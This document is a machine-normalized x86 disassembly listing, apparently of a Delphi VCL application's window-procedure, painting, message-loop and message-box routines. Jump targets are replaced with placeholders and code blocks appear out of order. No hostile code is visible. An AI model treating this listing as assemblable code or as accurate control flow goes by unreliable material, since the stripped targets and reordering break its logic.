mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418550
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46600c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c6b4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_464fc8
mov eax [ rw-data ]
call sub_465610
sub_466064
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4660c1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4660c8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4041e0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4660d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46610c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46685c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_466158
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403738#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46600c
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_467278
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_418550
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_44d054
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4681f4
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_466d94
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_466d38
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_44d054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46685c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_465610
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4660d0
pop ecx
jmp [ eax * 4 + jump_table_4661fc ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_44d054
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466c10
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4519cc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466064
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4206cc
jmp r-xdata
xor eax eax
call sub_45de98
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_44d054
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44790c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466878
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4660d0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_463810
jmp r-xdata
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
push ebp
call sub_46610c
pop ecx
jmp r-xdata
push ebp
call sub_4660d0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_465f70
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466928
jmp r-xdata
jmp r-xdata
call sub_43af70
call sub_43b050
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_465f60
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_465f70
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_465f68
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45dd48
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
call sub_45ddfc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4660d0
pop ecx
jmp r-xdata
call sub_43af70
call sub_43b0ac
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d05c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_466878
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_465f60
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_465890
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_44d054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_44d054
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_466928
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_465890
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_44d054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_465f70
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_44d054
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_46159c
mov eax [ ebx + 0x44 ]
call sub_4639b8
sub_466a28
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_466a64
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_40403c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_4040d8
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_466ab0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_466ad4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_466b24
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_443644
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_44d054
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_466bdc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_467b3c
sub_466c10
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_44d054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_40346c
test al al
jne r-xdata
sub_466c7c
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_466bdc
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_466ad4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_466b24
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_466ab0
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_466d14
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_466c7c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4675e4
sub_466d38
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418530
mov eax 0x8
call sub_4026f4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_4183f4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_466d94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418550
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402714
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418440
jmp r-xdata
sub_466e28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_466e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_44d030
mov [ esi + 0x44 ] edi
sub_466ea8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_466f86
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_45dcc0
call sub_407d8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f8d
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_46159c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403738#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_466d14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_4604a4
mov eax [ ebp - 0x4 ]
call sub_466878
jmp r-xdata
sub_466fa8
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402784
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_4027a4
push eax
call sub_402784
pop edx
call sub_40b594
call sub_402784
mov edx [ rw-data ]
call sub_4033fc
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402784
mov edx eax
mov eax ebx
call sub_4671a0
pop esi
pop ebx
retn
call sub_402784
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_467038
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45dd48
mov [ ebp - 0x10 ] eax
call sub_45dc64
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_465fdc
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46718d
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467194
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_45ddfc
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_45dc6c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_4671a0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46725b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404080
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_466a64
mov eax [ ebp - 0x108 ]
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
mov edx eax
mov eax ebx
pop ecx
call sub_467038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467262
lea eax [ ebp - 0x108 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
call sub_40854c
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d78
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b90
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042b0
sub_467278
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
